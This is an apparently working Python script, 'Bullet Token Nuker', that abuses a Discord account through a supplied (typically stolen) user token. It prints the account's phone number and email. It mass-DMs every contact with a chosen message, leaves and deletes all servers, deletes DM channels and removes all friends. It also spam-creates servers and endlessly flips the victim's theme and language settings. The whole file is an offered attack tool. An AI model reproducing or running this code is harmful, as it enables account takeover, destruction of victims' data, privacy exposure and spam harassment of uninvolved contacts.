import os, requests, signal, sys
from colorama import Fore
import random 

def exit_handler(signal, frame):
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + 'cya' + Fore.RESET )
    sys.exit(0)



def main(token):
    os.system('cls' if os.name == 'nt' else 'clear')
   
    datos = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json() 

    print(Fore.LIGHTBLACK_EX + f"""
          
                 ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄     ▄▄▄     ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ 
                █  ▄    █  █ █  █   █   █   █   █       █       █
                █ █▄█   █  █ █  █   █   █   █   █    ▄▄▄█▄     ▄█
                █       █  █▄█  █   █   █   █   █   █▄▄▄  █   █ 
                █  ▄   ██       █   █▄▄▄█   █▄▄▄█    ▄▄▄█ █   █  
                █ █▄█   █       █       █       █   █▄▄▄  █   █  
                █▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█ █▄▄▄█  

─────────────────────────────── 
[1]- Fuck token
[2]- Make servers 
[3]- Bugging Screem
[4]- Token Info                     
───────────────────────────────                     
          """)                                                                                                                                                                                                                                                                                                                                                     

    opciones = input(Fore.RED + 'Opcion: ' + Fore.RESET)

    if opciones == '1':
        nukeo(datos, token)
    elif opciones == '2':
        servidores(datos, token)
    elif opciones == '3':
        epi(datos, token)
    elif opciones == '4':
         dat(datos, token)
    else:
        input(Fore.RESET + "Opcion invalida...")
        main(token)

        
        
def dat(datos,token):  
    print(Fore.RED + f"""
   ─────────────────────────
    Numero: {datos['phone']}
    Email: {datos['email']}
    Nombre: {datos['username' ]}
   ─────────────────────────

    
    """
    ) 
    input(Fore.RESET + 'Datos extraídos finalizado...')
    main(token)
    

def nukeo(datos, token):
    invite = input(Fore.RED + 'Server Invite (without .gg) ' + Fore.RESET)
    userGuilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers={'Authorization': token}).json()
    guildIds = []
    userFriends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers={'Authorization': token}).json()
    userDms = requests.get('https://discord.com/api/v9/users/@me/channels', headers={'Authorization': token}).json()
    dmIds = []
    friendIds = []
    message = input(Fore.RED + 'Mass DM message :  ' + Fore.RESET)
    requests.post(f'https://discord.com/api/v9/invites/{invite}', headers={'Authorization': token})

    for guild in userGuilds:
        guildIds.append(guild['id'])

    for id in guildIds:
        requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{id}', headers={'Authorization': token})

    for id in guildIds:
        requests.delete(f'https://discord.com/api/v9/guilds/{id}', headers={'Authorization': token})

    for dm in userDms:
        dmIds.append(dm['id'])

    for id in dmIds:
        requests.post(f'https://discord.com/api/v9/channels/{id}/messages', headers={'Authorization': token}, json={'content': message})
        requests.delete(f'https://discord.com/api/v9/channels/{id}', headers={'Authorization': token})

    for friend in userFriends:
        friendIds.append(friend['id'])

    for id in friendIds:
        requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{id}', headers={'Authorization': token})

    requests.post(f'https://discord.com/api/v9/invites/{invite}', headers={'Authorization': token})

    input(Fore.RED + 'Nuked.')
    main(token)

    
        


def servidores(datos, token):
    guildName = input(Fore.RED + 'Server Names :  ' + Fore.RESET)
    while True:
        requests.post('https://discord.com/api/v9/guilds', headers={'Authorization': token}, json={'name': guildName, 'region': 'brazil'})
        input (Fore.LIGHTBLACK_EX + 'Ha finalizado de crear servidores...')
        main(token)


    
def epi(datos, token):
    while True:
        setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch('https://discord.com/api/v7/users/@me/settings', headers={'Authorization': token}, json=setting)

     


    





if __name__ == '__main__':
    os.system('title Bullet Token Nuker' if os.name == 'nt' else '')
    os.system('cls' if os.name == 'nt' else 'clear')
    signal.signal(signal.SIGINT, exit_handler)
    token = input(Fore.RED + 'Token :  ' + Fore.RESET)
    main(token)
